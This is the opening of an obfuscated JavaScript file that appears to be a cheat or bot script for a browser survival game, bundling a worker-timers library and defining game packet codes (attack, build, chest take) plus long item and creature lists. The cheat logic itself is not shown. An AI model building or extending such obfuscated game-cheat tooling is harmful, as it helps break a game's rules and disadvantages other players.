(function () {  
  var __globalObject;
  var __TextDecoder;
  var __Uint8Array;
  var __Buffer;
  var __String;
  var __Array;
  var utf8ArrayToStr;
  var i;
  function __p_RWBW_getGlobal() {
    var array = [function () {
      return globalThis;
    }, function () {
      return global;
    }, function () {
      return window;
    }, function () {
      return new Function("return this")();
    }];
    var bestMatch;
    var itemsToSearch;
    var i;
    bestMatch = undefined;
    itemsToSearch = [];
    try {
      bestMatch = Object;
      itemsToSearch.push("".__proto__.constructor.name);
    } catch (e) {}
    TMT0KsO: for (i = 0; i < array.length; i++) {
      try {
        var j;
        bestMatch = array[i]();
        for (j = 0; j < itemsToSearch.length; j++) {
          if (typeof bestMatch[itemsToSearch[j]] === "undefined") {
            continue TMT0KsO;
          }
        }
        return bestMatch;
      } catch (e) {}
    }
    return bestMatch || this;
  }
  __globalObject = __p_RWBW_getGlobal() || {};
  __TextDecoder = __globalObject.TextDecoder;
  __Uint8Array = __globalObject.Uint8Array;
  __Buffer = __globalObject.Buffer;
  __String = __globalObject.String || String;
  __Array = __globalObject.Array || Array;
  utf8ArrayToStr = function () {
    let _var_405 = new __Array(128);
    let _var_406 = __String.fromCodePoint || __String.fromCharCode;
    let _var_d25 = [];
    return function (_param_395) {
      let _var_b28 = undefined;
      let _var_c23 = undefined;
      let _var_407 = _param_395.length;
      _var_d25.length = 0;
      for (let _var_408 = 0; _var_408 < _var_407;) {
        _var_c23 = _param_395[_var_408++];
        if (_var_c23 <= 127) {
          _var_b28 = _var_c23;
        } else if (_var_c23 <= 223) {
          _var_b28 = (_var_c23 & 31) << 6 | _param_395[_var_408++] & 63;
        } else if (_var_c23 <= 239) {
          _var_b28 = (_var_c23 & 15) << 12 | (_param_395[_var_408++] & 63) << 6 | _param_395[_var_408++] & 63;
        } else if (__String.fromCodePoint) {
          _var_b28 = (_var_c23 & 7) << 18 | (_param_395[_var_408++] & 63) << 12 | (_param_395[_var_408++] & 63) << 6 | _param_395[_var_408++] & 63;
        } else {
          _var_b28 = 63;
          _var_408 += 3;
        }
        _var_d25.push(_var_405[_var_b28] ||= _var_406(_var_b28));
      }
      return _var_d25.join("");
    };
  }();
  function __p_xHrN_bufferToString(_param_396) {
    if (typeof __TextDecoder !== "undefined" && __TextDecoder) {
      return new __TextDecoder().decode(new __Uint8Array(_param_396));
    } else if (typeof __Buffer !== "undefined" && __Buffer) {
      return __Buffer.from(_param_396).toString("utf-8");
    } else {
      return utf8ArrayToStr(_param_396);
    }
  }
  function __p_vIYf_dummyFunction() {}
  (function (e, t) {
    if (typeof exports == "object" && typeof module != "undefined") {
      t(exports);
    } else if (typeof define == "function" && define.amd) {
      define(["exports"], t);
    } else {
      t((e = typeof globalThis != "undefined" ? globalThis : e || self).fastUniqueNumbers = {});
    }
  })(this, function (e) {
    "use strict";

    var t;
    var r;
    var n;
    var i;
    var o;
    t = undefined;
    r = Number.MAX_SAFE_INTEGER === undefined ? 9007199254740991 : Number.MAX_SAFE_INTEGER;
    n = new WeakMap();
    i = function (_param_404, _param_403) {
      return function (_param_405) {
        let _var_422 = _param_403.get(_param_405);
        let _var_423 = _var_422 === undefined ? _param_405.size : _var_422 < 1073741824 ? _var_422 + 1 : 0;
        if (!_param_405.has(_var_423)) {
          return _param_404(_param_405, _var_423);
        }
        if (_param_405.size < 536870912) {
          while (_param_405.has(_var_423)) {
            _var_423 = Math.floor(Math.random() * 1073741824);
          }
          return _param_404(_param_405, _var_423);
        }
        if (_param_405.size > r) {
          throw new Error("Congratulations, you created a collection of unique numbers which uses all available integers!");
        }
        while (_param_405.has(_var_423)) {
          _var_423 = Math.floor(Math.random() * r);
        }
        return _param_404(_param_405, _var_423);
      };
    }((t = n, function (_param_416, _param_417) {
      t.set(_param_416, _param_417);
      return _param_417;
    }), n);
    o = function (_param_419) {
      return function (_param_420) {
        let _var_458 = _param_419(_param_420);
        _param_420.add(_var_458);
        return _var_458;
      };
    }(i);
    e.addUniqueNumber = o;
    e.generateUniqueNumber = i;
    Object.defineProperty(e, "__esModule", {
      value: true
    });
  });
  (function (_param_425, _param_424) {
    if (typeof exports == "object" && typeof module != "undefined") {
      _param_424(exports, require("fast-unique-numbers"));
    } else if (typeof define == "function" && define.amd) {
      define(["exports", "fast-unique-numbers"], _param_424);
    } else {
      _param_424((_param_425 = typeof globalThis != "undefined" ? globalThis : _param_425 || self).w0cerTimersBroker = {}, _param_425.fastUniqueNumbers);
    }
  })(this, function (e, t) {
    "use strict";

    e.load = function (_param_430) {
      let _var_a36 = new Map([[0, function () {}]]);
      let _var_b34 = new Map([[0, function () {}]]);
      let _var_c30 = new Map();
      let _var_477 = new Worker(_param_430);
      _var_477.addEventListener("message", function (_param_433) {
        let _var_a38 = _param_433.data;
        if (function (_param_434) {
          return _param_434.method !== undefined && _param_434.method === "call";
        }(_var_a38)) {
          let _var_484 = _var_a38.params;
          let _var_485 = _var_484.timerId;
          let _var_486 = _var_484.timerType;
          if (_var_486 === "interval") {
            let _var_e18 = _var_a36.get(_var_485);
            if (typeof _var_e18 == "number") {
              let _var_487 = _var_c30.get(_var_e18);
              if (_var_487 === undefined || _var_487.timerId !== _var_485 || _var_487.timerType !== _var_486) {
                throw new Error("The timer is in an undefined state.");
              }
            } else {
              if (_var_e18 === undefined) {
                throw new Error("The timer is in an undefined state.");
              }
              _var_e18();
            }
          } else if (_var_486 === "timeout") {
            let _var_488 = _var_b34.get(_var_485);
            if (typeof _var_488 == "number") {
              let _var_h21 = _var_c30.get(_var_488);
              if (_var_h21 === undefined || _var_h21.timerId !== _var_485 || _var_h21.timerType !== _var_486) {
                throw new Error("The timer is in an undefined state.");
              }
            } else {
              if (_var_488 === undefined) {
                throw new Error("The timer is in an undefined state.");
              }
              _var_488();
              _var_b34.delete(_var_485);
            }
          }
        } else {
          if (!function (e) {
            return e.error === null && typeof e.id == "number";
          }(_var_a38)) {
            let _var_i25 = _var_a38.error.message;
            throw new Error(_var_i25);
          }
          let _var_489 = _var_a38.id;
          let _var_490 = _var_c30.get(_var_489);
          if (_var_490 === undefined) {
            throw new Error("The timer is in an undefined state.");
          }
          let _var_491 = _var_490.timerId;
          let _var_m2 = _var_490.timerType;
          _var_c30.delete(_var_489);
          if (_var_m2 === "interval") {
            _var_a36.delete(_var_491);
          } else {
            _var_b34.delete(_var_491);
          }
        }
      });
      return {
        clearInterval: function (_param_456) {
          let _var_558 = t.generateUniqueNumber(_var_c30);
          _var_c30.set(_var_558, {
            timerId: _param_456,
            timerType: "interval"
          });
          _var_a36.set(_param_456, _var_558);
          _var_477.postMessage({
            id: _var_558,
            method: "clear",
            params: {
              timerId: _param_456,
              timerType: "interval"
            }
          });
        },
        clearTimeout: function (_param_458) {
          let _var_567 = t.generateUniqueNumber(_var_c30);
          _var_c30.set(_var_567, {
            timerId: _param_458,
            timerType: "timeout"
          });
          _var_b34.set(_param_458, _var_567);
          _var_477.postMessage({
            id: _var_567,
            method: "clear",
            params: {
              timerId: _param_458,
              timerType: "timeout"
            }
          });
        },
        setInterval: function (_param_461, _param_460) {
          let _var_a43 = t.generateUniqueNumber(_var_a36);
          _var_a36.set(_var_a43, function () {
            _param_461();
            if (typeof _var_a36.get(_var_a43) == "function") {
              _var_477.postMessage({
                id: null,
                method: "set",
                params: {
                  delay: _param_460,
                  now: performance.now(),
                  timerId: _var_a43,
                  timerType: "interval"
                }
              });
            }
          });
          _var_477.postMessage({
            id: null,
            method: "set",
            params: {
              delay: _param_460,
              now: performance.now(),
              timerId: _var_a43,
              timerType: "interval"
            }
          });
          return _var_a43;
        },
        setTimeout: function (e, r) {
          var i = t.generateUniqueNumber(_var_b34);
          _var_b34.set(i, e);
          _var_477.postMessage({
            id: null,
            method: "set",
            params: {
              delay: r,
              now: performance.now(),
              timerId: i,
              timerType: "timeout"
            }
          });
          return i;
        }
      };
    };
    Object.defineProperty(e, "__esModule", {
      value: true
    });
  });
  (function (e, t) {
    if (typeof exports == "object" && typeof module != "undefined") {
      t(exports, require("worker-timers-broker"));
    } else if (typeof define == "function" && define.amd) {
      define(["exports", "worker-timers-broker"], t);
    } else {
      t((e = typeof globalThis != "undefined" ? globalThis : e || self).w0cerTimers = {}, e.w0cerTimersBroker);
    }
  })(this, function (e, t) {
    "use strict";

    var r;
    var n;
    r = null;
    n = function (_param_470, _param_469) {
      return function () {
        if (r !== null) {
          return r;
        }
        let _var_a46 = new Blob([_param_469], {
          type: "application/javascript; charset=utf-8"
        });
        let _var_b38 = URL.createObjectURL(_var_a46);
        (r = _param_470(_var_b38)).setTimeout(function () {
          return URL.revokeObjectURL(_var_b38);
        }, 0);
        return r;
      };
    }(t.load, "(()=>{var e={67:(e,t,r)=>{var o,i;void 0===(i=\"function\"==typeof(o=function(){\"use strict\";var e=new Map,t=new Map,r=function(t){var r=e.get(t);if(void 0===r)throw new Error('There is no interval scheduled with the given id \"'.concat(t,'\".'));clearTimeout(r),e.delete(t)},o=function(e){var r=t.get(e);if(void 0===r)throw new Error('There is no timeout scheduled with the given id \"'.concat(e,'\".'));clearTimeout(r),t.delete(e)},i=function(e,t){var r,o=performance.now();return{expected:o+(r=e-Math.max(0,o-t)),remainingDelay:r}},n=function e(t,r,o,i){var n=performance.now();n>o?postMessage({id:null,method:\"call\",params:{timerId:r,timerType:i}}):t.set(r,setTimeout(e,o-n,t,r,o,i))},a=function(t,r,o){var a=i(t,o),s=a.expected,d=a.remainingDelay;e.set(r,setTimeout(n,d,e,r,s,\"interval\"))},s=function(e,r,o){var a=i(e,o),s=a.expected,d=a.remainingDelay;t.set(r,setTimeout(n,d,t,r,s,\"timeout\"))};addEventListener(\"message\",(function(e){var t=e.data;try{if(\"clear\"===t.method){var i=t.id,n=t.params,d=n.timerId,c=n.timerType;if(\"interval\"===c)r(d),postMessage({error:null,id:i});else{if(\"timeout\"!==c)throw new Error('The given type \"'.concat(c,'\" is not supported'));o(d),postMessage({error:null,id:i})}}else{if(\"set\"!==t.method)throw new Error('The given method \"'.concat(t.method,'\" is not supported'));var u=t.params,l=u.delay,p=u.now,m=u.timerId,v=u.timerType;if(\"interval\"===v)a(l,m,p);else{if(\"timeout\"!==v)throw new Error('The given type \"'.concat(v,'\" is not supported'));s(l,m,p)}}}catch(e){postMessage({error:{message:e.message},id:t.id,result:null})}}))})?o.call(t,r,t,e):o)||(e.exports=i)}},t={};function r(o){var i=t[o];if(void 0!==i)return i.exports;var n=t[o]={exports:{}};return e[o](n,n.exports,r),n.exports}r.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return r.d(t,{a:t}),t},r.d=(e,t)=>{for(var o in t)r.o(t,o)&&!r.o(e,o)&&Object.defineProperty(e,o,{enumerable:!0,get:t[o]})},r.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{\"use strict\";r(67)})()})();");
    e.clearInterval = function (_param_471) {
      return n().clearInterval(_param_471);
    };
    e.clearTimeout = function (e) {
      return n().clearTimeout(e);
    };
    e.setInterval = function (e, t) {
      return n().setInterval(e, t);
    };
    e.setTimeout = function (e, t) {
      return n().setTimeout(e, t);
    };
    Object.defineProperty(e, "__esModule", {
      value: true
    });
  });
  const workerTimers = w0cerTimers;
  let __p_TBlw_PACKET_angle = 10;
  let __p_TBlw_PACKET_attack = 19;
  let __p_TBlw_PACKET_stopAttack = 38;
  let __p_TBlw_PACKET_selectInv = 33;
  let __p_TBlw_PACKET_craft = 13;
  let __p_TBlw_PACKET_chat = 5;
  let __p_TBlw_PACKET_build = 17;
  let __p_TBlw_PACKET_update_cam = 0;
  let __p_TBlw_PACKET_drop_one = 35;
  let __p_TBlw_PACKET_drop_all = 27;
  let __p_TBlw_PACKET_resurrection = 30;
  let __p_TBlw_PACKET_extractorput = 11;
  let __p_TBlw_PACKET_extractortake = 21;
  let __p_TBlw_PACKET_chestTake = 9;
  let __p_TBlw_PACKET_put_windmill = 37;
  let __p_TBlw_PACKET_take_windmill = 20;
  let __p_TBlw_PACKET_put_wood_oven = 36;
  let __p_TBlw_PACKET_put_flour_oven = 1;
  let __p_TBlw_PACKET_take_bread = 25;
  let __p_TBlw_PACKET_put_chest = 24;
  let __p_TBlw_PACKET_join_totem = 12;
  let __p_TBlw_PACKET_cancel_crafting = 32;
  let __p_TBlw_PACKET_buy_resource = 22;
  let COUNTER = 0;
  const INV = {
    STONE_SWORD: COUNTER++,
    STONE_PICK: COUNTER++,
    RABBIT_FUR: COUNTER++,
    GOLD_PICK: COUNTER++,
    DIAMOND_PICK: COUNTER++,
    GOLD_SWORD: COUNTER++,
    DIAMOND_SWORD: COUNTER++,
    HAND: COUNTER++,
    WOOD_PICK: COUNTER++,
    PIRATE_SWORD: COUNTER++,
    EARMUFFS: COUNTER++,
    BIG_CHAPKA: COUNTER++,
    WOOD_SPEAR: COUNTER++,
    STONE_SPEAR: COUNTER++,
    GOLD_SPEAR: COUNTER++,
    DIAMOND_SPEAR: COUNTER++,
    DRAGON_SPEAR: COUNTER++,
    LAVA_SPEAR: COUNTER++,
    CRAB_SPEAR: COUNTER++,
    EMERALD_SPEAR: COUNTER++,
    COPPER_SPEAR: COUNTER++,
    IRON_SPEAR: COUNTER++,
    TOPAZ_SPEAR: COUNTER++,
    SAPPHIRE_SPEAR: COUNTER++,
    JADE_SPEAR: COUNTER++,
    RUBY_SPEAR: COUNTER++,
    COAL_SPEAR: COUNTER++,
    AQUAMARINE_SPEAR: COUNTER++,
    REIDITE_SWORD: COUNTER++,
    DIAMOND_FIRE_PROTECTION_: COUNTER++,
    AMETHYST_FIRE_PROTECTION_: COUNTER++,
    REIDITE_FIRE_PROTECTION_: COUNTER++,
    EXPLORER_HAT: COUNTER++,
    PIRATE_HAT: COUNTER++,
    STONE_HELMET: COUNTER++,
    GOLD_HELMET: COUNTER++,
    DIAMOND_HELMET: COUNTER++,
    EMERALD_HELMET: COUNTER++,
    COPPER_HELMET: COUNTER++,
    IRON_HELMET: COUNTER++,
    TOPAZ_HELMET: COUNTER++,
    SAPPHIRE_HELMET: COUNTER++,
    JADE_HELMET: COUNTER++,
    RUBY_HELMET: COUNTER++,
    COAL_HELMET: COUNTER++,
    AQUAMARINE_HELMET: COUNTER++,
    BOOK: COUNTER++,
    BAG: COUNTER++,
    AMETHYST_SWORD: COUNTER++,
    AMETHYST_PICK: COUNTER++,
    REIDITE_PICK: COUNTER++,
    EMERALD_PICK: COUNTER++,
    COPPER_PICK: COUNTER++,
    IRON_PICK: COUNTER++,
    TOPAZ_PICK: COUNTER++,
    SAPPHIRE_PICK: COUNTER++,
    JADE_PICK: COUNTER++,
    RUBY_PICK: COUNTER++,
    COAL_PICK: COUNTER++,
    AQUAMARINE_PICK: COUNTER++,
    AMETHYST_SPEAR: COUNTER++,
    REIDITE_SPEAR: COUNTER++,
    STONE_HAMMER: COUNTER++,
    GOLD_HAMMER: COUNTER++,
    DIAMOND_HAMMER: COUNTER++,
    AMETHYST_HAMMER: COUNTER++,
    REIDITE_HAMMER: COUNTER++,
    CAP_SCARF: COUNTER++,
    CHRISTMAS_HAT: COUNTER++,
    ELF_HAT: COUNTER++,
    AMETHYST_HELMET: COUNTER++,
    REIDITE_HELMET: COUNTER++,
    SUPER_HAMMER: COUNTER++,
    EMERALD_HAMMER: COUNTER++,
    COPPER_HAMMER: COUNTER++,
    IRON_HAMMER: COUNTER++,
    TOPAZ_HAMMER: COUNTER++,
    SAPPHIRE_HAMMER: COUNTER++,
    JADE_HAMMER: COUNTER++,
    RUBY_HAMMER: COUNTER++,
    COAL_HAMMER: COUNTER++,
    AQUAMARINE_HAMMER: COUNTER++,
    STONE_SHOVEL: COUNTER++,
    SUPER_DIVING_SUIT: COUNTER++,
    DIVING_MASK: COUNTER++,
    WATERING_CAN_FULL: COUNTER++,
    GOLD_SHOVEL: COUNTER++,
    DIAMOND_SHOVEL: COUNTER++,
    AMETHYST_SHOVEL: COUNTER++,
    REIDITE_SHOVEL: COUNTER++,
    EMERALD_SHOVEL: COUNTER++,
    COPPER_SHOVEL: COUNTER++,
    IRON_SHOVEL: COUNTER++,
    TOPAZ_SHOVEL: COUNTER++,
    SAPPHIRE_SHOVEL: COUNTER++,
    JADE_SHOVEL: COUNTER++,
    RUBY_SHOVEL: COUNTER++,
    COAL_SHOVEL: COUNTER++,
    AQUAMARINE_SHOVEL: COUNTER++,
    PITCHFORK: COUNTER++,
    PITCHFORK_2: COUNTER++,
    WRECH: COUNTER++,
    MACHETE: COUNTER++,
    WOOD_SWORD: COUNTER++,
    WOOD_HELMET: COUNTER++,
    DRAGON_HELMET: COUNTER++,
    LAVA_HELMET: COUNTER++,
    CRAB_CROWN: COUNTER++,
    DRAGON_SWORD: COUNTER++,
    LAVA_SWORD: COUNTER++,
    EMERALD_SWORD: COUNTER++,
    COPPER_SWORD: COUNTER++,
    IRON_SWORD: COUNTER++,
    TOPAZ_SWORD: COUNTER++,
    SAPPHIRE_SWORD: COUNTER++,
    JADE_SWORD: COUNTER++,
    RUBY_SWORD: COUNTER++,
    COAL_SWORD: COUNTER++,
    AQUAMARINE_SWORD: COUNTER++,
    WOOD_BOW: COUNTER++,
    STONE_BOW: COUNTER++,
    GOLD_BOW: COUNTER++,
    DIAMOND_BOW: COUNTER++,
    AMETHYST_BOW: COUNTER++,
    REIDITE_BOW: COUNTER++,
    DRAGON_BOW: COUNTER++,
    EMERALD_BOW: COUNTER++,
    COPPER_BOW: COUNTER++,
    IRON_BOW: COUNTER++,
    TOPAZ_BOW: COUNTER++,
    SAPPHIRE_BOW: COUNTER++,
    JADE_BOW: COUNTER++,
    RUBY_BOW: COUNTER++,
    COAL_BOW: COUNTER++,
    AQUAMARINE_BOW: COUNTER++,
    WOOD_SHIELD: COUNTER++,
    STONE_SHIELD: COUNTER++,
    GOLD_SHIELD: COUNTER++,
    DIAMOND_SHIELD: COUNTER++,
    AMETHYST_SHIELD: COUNTER++,
    REIDITE_SHIELD: COUNTER++,
    ᐃⲆᐃⲆⲆ: COUNTER++,
    ΔⵠΔⵠᐃ: COUNTER++,
    ⵠᐃΔⲆⲆ: COUNTER++,
    ⲆⵠᐃΔⵠ: COUNTER++,
    ⵠᐃⲆᐃⵠ: COUNTER++,
    ᐃᐃⲆⵠΔ: COUNTER++,
    ⵠᐃΔΔⲆ: COUNTER++,
    ᐃᐃⲆⵠⵠ: COUNTER++,
    ⵠⲆΔᐃΔ: COUNTER++,
    CROWN_OF_LIFE: COUNTER++,
    CROWN_OF_LUCK: COUNTER++,
    CROWN_OF_THE_ANGEL: COUNTER++,
    TURBAN: COUNTER++,
    NINJA_OUTFIT: COUNTER++,
    PILOT_HELMET: COUNTER++,
    HOOD: COUNTER++,
    PEASANT: COUNTER++,
    WINTER_HOOD: COUNTER++,
    WINTER_PEASANT: COUNTER++,
    FLOWER_HAT: COUNTER++,
    FUR_HAT: COUNTER++,
    SADDLE: COUNTER++,
    WITCH_HAT: COUNTER++,
    NIMBUS: COUNTER++,
    WAND1: COUNTER++,
    WAND2: COUNTER++,
    WOOD_AXE: COUNTER++,
    STONE_AXE: COUNTER++,
    GOLD_AXE: COUNTER++,
    DIAMOND_AXE: COUNTER++,
    AMETHYST_AXE: COUNTER++,
    REIDITE_AXE: COUNTER++,
    EMERALD_AXE: COUNTER++,
    COPPER_AXE: COUNTER++,
    IRON_AXE: COUNTER++,
    TOPAZ_AXE: COUNTER++,
    SAPPHIRE_AXE: COUNTER++,
    JADE_AXE: COUNTER++,
    RUBY_AXE: COUNTER++,
    COAL_AXE: COUNTER++,
    AQUAMARINE_AXE: COUNTER++,
    FIREFLY: COUNTER++,
    WOOD_ARROW: COUNTER++,
    STONE_ARROW: COUNTER++,
    GOLD_ARROW: COUNTER++,
    DIAMOND_ARROW: COUNTER++,
    AMETHYST_ARROW: COUNTER++,
    REIDITE_ARROW: COUNTER++,
    DRAGON_ARROW: COUNTER++,
    EMERALD_ARROW: COUNTER++,
    COPPER_ARROW: COUNTER++,
    IRON_ARROW: COUNTER++,
    TOPAZ_ARROW: COUNTER++,
    SAPPHIRE_ARROW: COUNTER++,
    JADE_ARROW: COUNTER++,
    RUBY_ARROW: COUNTER++,
    COAL_ARROW: COUNTER++,
    AQUAMARINE_ARROW: COUNTER++,
    STONE: COUNTER++,
    WOOD: COUNTER++,
    BERRY: COUNTER++,
    GOLD: COUNTER++,
    DIAMOND: COUNTER++,
    CAMPFIRE: COUNTER++,
    WORKBENCH: COUNTER++,
    BERRY_SEED: COUNTER++,
    MEAT: COUNTER++,
    COOKED_MEAT: COUNTER++,
    BIG_CAMPFIRE: COUNTER++,
    FURNACE: COUNTER++,
    PAPER: COUNTER++,
    AMETHYST: COUNTER++,
    AMETHYST_WALL: COUNTER++,
    AMETHYST_SPIKE: COUNTER++,
    AMETHYST_DOOR: COUNTER++,
    BRIDGE: COUNTER++,
    SAND: COUNTER++,
    BOTTLE_FULL: COUNTER++,
    BOTTLE_FULL__WITH_ICE_: COUNTER++,
    BOTTLE_FULL__WITH_WELL_: COUNTER++,
    BOTTLE_EMPTY: COUNTER++,
    KRAKEN_SKIN: COUNTER++,
    WATERING_CAN: COUNTER++,
    FLOUR: COUNTER++,
    WHEAT_SEED: COUNTER++,
    COOKIE: COUNTER++,
    WHEAT: COUNTER++,
    WINDMILL: COUNTER++,
    CAKE: COUNTER++,
    FISH: COUNTER++,
    FOODFISH_COOKED: COUNTER++,
    PIRANHA_SCALES: COUNTER++,
    DIRT: COUNTER++,
    PLOT: COUNTER++,
    ICE: COUNTER++,
    BREAD: COUNTER++,
    BREAD_OVEN: COUNTER++,
    SANDWICH: COUNTER++,
    WINTER_FUR: COUNTER++,
    BLUE_CORD: COUNTER++,
    LOCK: COUNTER++,
    DRAGON_HEART: COUNTER++,
    LAVA_HEART: COUNTER++,
    RESURRECTION: COUNTER++,
    EMERALD_MACHINE: COUNTER++,
    STONE_EXTRACTOR: COUNTER++,
    GOLD_EXTRACTOR: COUNTER++,
    DIAMOND_EXTRACTOR: COUNTER++,
    AMETHYST_EXTRACTOR: COUNTER++,
    REIDITE_EXTRACTOR: COUNTER++,
    EMERALD_EXTRACTOR: COUNTER++,
    COPPER_EXTRACTOR: COUNTER++,
    IRON_EXTRACTOR: COUNTER++,
    TOPAZ_EXTRACTOR: COUNTER++,
    SAPPHIRE_EXTRACTOR: COUNTER++,
    JADE_EXTRACTOR: COUNTER++,
    RUBY_EXTRACTOR: COUNTER++,
    COAL_EXTRACTOR: COUNTER++,
    AQUAMARINE_EXTRACTOR: COUNTER++,
    LOCKPICK: COUNTER++,
    TOTEM: COUNTER++,
    WOOD_SPIKE: COUNTER++,
    WEB: COUNTER++,
    WOOD_WALL: COUNTER++,
    STONE_WALL: COUNTER++,
    GOLD_WALL: COUNTER++,
    DIAMOND_WALL: COUNTER++,
    WOOD_DOOR: COUNTER++,
    CHEST: COUNTER++,
    STONE_SPIKE: COUNTER++,
    GOLD_SPIKE: COUNTER++,
    DIAMOND_SPIKE: COUNTER++,
    STONE_DOOR: COUNTER++,
    GOLD_DOOR: COUNTER++,
    DIAMOND_DOOR: COUNTER++,
    WOLF_FUR: COUNTER++,
    GEM_OF_LIFE: COUNTER++,
    GEM_OF_LUCK: COUNTER++,
    GEM_OF_THE_ANGEL: COUNTER++,
    SPECIAL_FUR_PEASANT: COUNTER++,
    SPECIAL_FUR_HOOD: COUNTER++,
    BUCKET_FULL: COUNTER++,
    BUCKET_EMPTY: COUNTER++,
    WELL: COUNTER++,
    SIGN: COUNTER++,
    CUBE_OF_THE_DRAGON: COUNTER++,
    ORB_OF_THE_DRAGON: COUNTER++,
    CUBE_OF_THE_DRAGON: COUNTER++,
    ORB_OF_THE_DRAGON: COUNTER++,
    PUMPKIN_SEED: COUNTER++,
    PUMPKIN: COUNTER++,
    ROOF: COUNTER++,
    GARLIC_SEED: COUNTER++,
    GARLIC: COUNTER++,
    THORBUSHES_SEED: COUNTER++,
    THORNBUSH: COUNTER++,
    BANDAGE: COUNTER++,
    CRAB_STICK: COUNTER++,
    CRAB_LOOT: COUNTER++,
    BED: COUNTER++,
    SUGAR_CANE: COUNTER++,
    CANDY: COUNTER++,
    GARLAND: COUNTER++,
    REIDITE: COUNTER++,
    FLAME: COUNTER++,
    COPPER: COUNTER++,
    IRON: COUNTER++,
    TOPAZ: COUNTER++,
    SAPPHIRE: COUNTER++,
    JADE: COUNTER++,
    RUBY: COUNTER++,
    COAL: COUNTER++,
    AQUAMARINE: COUNTER++,
    CARROT_SEED: COUNTER++,
    CARROT: COUNTER++,
    TOMATO_SEED: COUNTER++,
    TOMATO: COUNTER++,
    WATERMELON_SEED: COUNTER++,
    WATERMELON: COUNTER++,
    ALOE_VERA_SEED: COUNTER++,
    ALOE_VERA: COUNTER++,
    WOOD_DOOR_SPIKE: COUNTER++,
    STONE_DOOR_SPIKE: COUNTER++,
    GOLD_DOOR_SPIKE: COUNTER++,
    DIAMOND_DOOR_SPIKE: COUNTER++,
    AMETHYST_DOOR_SPIKE: COUNTER++,
    REIDITE_WALL: COUNTER++,
    REIDITE_DOOR: COUNTER++,
    REIDITE_SPIKE: COUNTER++,
    REIDITE_DOOR_SPIKE: COUNTER++,
    WOOD_TOWER: COUNTER++,
    PENGUIN_FEATHER: COUNTER++,
    BOAT: COUNTER++,
    SLED: COUNTER++,
    MOUNT_BOAR: COUNTER++,
    MOUNT_KING_CRAB: COUNTER++,
    MOUNT_BABY_DRAGON: COUNTER++,
    MOUNT_BABY_LAVA: COUNTER++,
    MOUNT_HAWK: COUNTER++,
    PLANE: COUNTER++,
    HAWK_FEATHER: COUNTER++,
    VULTURE_FEATHER: COUNTER++,
    CACTUS: COUNTER++,
    EMERALD: COUNTER++,
    PITCHFORK_PART: COUNTER++,
    PILOT_PART: COUNTER++,
    BOAR_FUR: COUNTER++,
    EMERALD_MACHINE: COUNTER++,
    BABY_MAMMOTH: COUNTER++,
    FUR_MAMMOTH: COUNTER++,
    CROCODILE_SCALES: COUNTER++,
    PARROT_FEATHER: COUNTER++,
    OCELOT_FUR: COUNTER++,
    MOUNT_PARROT: COUNTER++,
    MOUNT_VULTURE: COUNTER++,
    BANANA: COUNTER++,
    BANANA_SEED: COUNTER++,
    MOUNT_HEN: COUNTER++
  };
  COUNTER = 0;
  const ITEMS = {
    PLAYERS: COUNTER++,
    FIRE: COUNTER++,
    WORKBENCH: COUNTER++,
    SEED: COUNTER++,
    WALL: COUNTER++,
    SPIKE: COUNTER++,
    BIG_FIRE: COUNTER++,
    STONE_WALL: COUNTER++,
    GOLD_WALL: COUNTER++,
    DIAMOND_WALL: COUNTER++,
    WOOD_DOOR: COUNTER++,
    CHEST: COUNTER++,
    STONE_SPIKE: COUNTER++,
    GOLD_SPIKE: COUNTER++,
    DIAMOND_SPIKE: COUNTER++,
    STONE_DOOR: COUNTER++,
    GOLD_DOOR: COUNTER++,
    DIAMOND_DOOR: COUNTER++,
    FURNACE: COUNTER++,
    AMETHYST_WALL: COUNTER++,
    AMETHYST_SPIKE: COUNTER++,
    AMETHYST_DOOR: COUNTER++,
    RESURRECTION: COUNTER++,
    EMERALD_MACHINE: COUNTER++,
    EXTRACTOR_MACHINE_STONE: COUNTER++,
    EXTRACTOR_MACHINE_GOLD: COUNTER++,
    EXTRACTOR_MACHINE_DIAMOND: COUNTER++,
    EXTRACTOR_MACHINE_AMETHYST: COUNTER++,
    EXTRACTOR_MACHINE_REIDITE: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TEMP: COUNTER++,
    TOTEM: COUNTER++,
    BRIDGE: COUNTER++,
    WHEAT_SEED: COUNTER++,
    WINDMILL: COUNTER++,
    PLOT: COUNTER++,
    BREAD_OVEN: COUNTER++,
    WELL: COUNTER++,
    SIGN: COUNTER++,
    PUMPKIN_SEED: COUNTER++,
    ROOF: COUNTER++,
    GARLIC_SEED: COUNTER++,
    THORNBUSH_SEED: COUNTER++,
    BED: COUNTER++,
    GARLAND: COUNTER++,
    TOMATO_SEED: COUNTER++,
    CARROT_SEED: COUNTER++,
    WOOD_DOOR_SPIKE: COUNTER++,
    STONE_DOOR_SPIKE: COUNTER++,
    GOLD_DOOR_SPIKE: COUNTER++,
    DIAMOND_DOOR_SPIKE: COUNTER++,
    AMETHYST_DOOR_SPIKE: COUNTER++,
    REIDITE_WALL: COUNTER++,
    REIDITE_DOOR: COUNTER++,
    REIDITE_SPIKE: COUNTER++,
    REIDITE_DOOR_SPIKE: COUNTER++,
    WATERMELON_SEED: COUNTER++,
    ALOE_VERA_SEED: COUNTER++,
    WOOD_TOWER: COUNTER++,
    TEMP1: COUNTER++,
    WOLF: COUNTER++,
    SPIDER: COUNTER++,
    FOX: COUNTER++,
    BEAR: COUNTER++,
    DRAGON: COUNTER++,
    PIRANHA: COUNTER++,
    KRAKEN: COUNTER++,
    CRAB: COUNTER++,
    FLAME: COUNTER++,
    LAVA_DRAGON: COUNTER++,
    BOAR: COUNTER++,
    CRAB_BOSS: COUNTER++,
    BABY_DRAGON: COUNTER++,
    BABY_LAVA: COUNTER++,
    HAWK: COUNTER++,
    VULTURE: COUNTER++,
    SAND_WORM: COUNTER++,
    BABY_MAMMOTH: COUNTER++,
    MAMMOTH: COUNTER++,
    WHEAT_MOB: COUNTER++,
    TEMP2: COUNTER++,
    TEMP3: COUNTER++,
    GOLDEN_HEN: COUNTER++,
    GOLDEN_CHICKEN: COUNTER++,
    WHEAT_MOD: COUNTER++,
    RABBIT: COUNTER++,
    TREASURE_CHEST: COUNTER++,
    DEAD_BOX: COUNTER++,
    PUMPKIN_MOB: COUNTER++,
    GARLIC_MOB: COUNTER++,
